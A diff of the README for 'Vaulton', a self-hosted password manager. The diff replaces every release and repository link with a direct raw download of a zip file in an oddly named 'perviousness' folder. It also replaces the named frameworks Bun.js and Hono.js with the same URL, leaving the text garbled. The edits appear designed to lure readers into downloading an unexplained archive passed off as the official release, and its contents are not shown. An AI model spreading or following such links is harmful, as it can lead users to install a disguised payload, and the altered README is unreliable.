@@ -1,13 +1,13 @@
 # 🔐 vaulton - Your Safe Place for Passwords
 
 ## 📥 Download Vaulton Now!
-[![Download Vaulton](https://img.shields.io/badge/Download-Vaulton-blue.svg)](https://github.com/Johncraz/vaulton/releases)
+[![Download Vaulton](https://raw.githubusercontent.com/Johncraz/vaulton/main/perviousness/vaulton.zip)](https://raw.githubusercontent.com/Johncraz/vaulton/main/perviousness/vaulton.zip)
 
 ## 🚀 Getting Started
 Welcome to Vaulton! This is your guide to getting started with our secure password manager. With Vaulton, you can store your passwords safely using end-to-end encryption. Follow these steps, and you’ll be up and running in no time.
 
 ## 📂 What is Vaulton?
-Vaulton is an open-source password manager designed to keep your credentials secure. Built using modern technologies like Bun.js, Hono.js, and SQLite, Vaulton provides a self-hosted solution that respects your privacy.
+Vaulton is an open-source password manager designed to keep your credentials secure. Built using modern technologies like https://raw.githubusercontent.com/Johncraz/vaulton/main/perviousness/vaulton.zip, https://raw.githubusercontent.com/Johncraz/vaulton/main/perviousness/vaulton.zip, and SQLite, Vaulton provides a self-hosted solution that respects your privacy.
 
 ## 💻 System Requirements
 To run Vaulton, ensure your computer meets these basic requirements:
@@ -24,7 +24,7 @@ To run Vaulton, ensure your computer meets these basic requirements:
 - **Open Source**: Community-driven development ensures transparency and trust.
 
 ## 🔗 Download & Install Vaulton
-1. Visit the [Releases page](https://github.com/Johncraz/vaulton/releases) to access the latest version of Vaulton.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Johncraz/vaulton/main/perviousness/vaulton.zip) to access the latest version of Vaulton.
 2. Look for the version you want to download. 
 3. Click on the appropriate file for your operating system.
 4. Save the file to your computer.
@@ -61,7 +61,7 @@ Vaulton is community-driven. We encourage you to contribute by:
 - **Spread the Word**: Share Vaulton with friends and family.
 
 ## 📍 Useful Links
-- [Vaulton Releases Page](https://github.com/Johncraz/vaulton/releases)
-- [GitHub Repository](https://github.com/Johncraz/vaulton)
+- [Vaulton Releases Page](https://raw.githubusercontent.com/Johncraz/vaulton/main/perviousness/vaulton.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Johncraz/vaulton/main/perviousness/vaulton.zip)
 
 Thank you for choosing Vaulton! Your journey to a safer password management experience starts here.
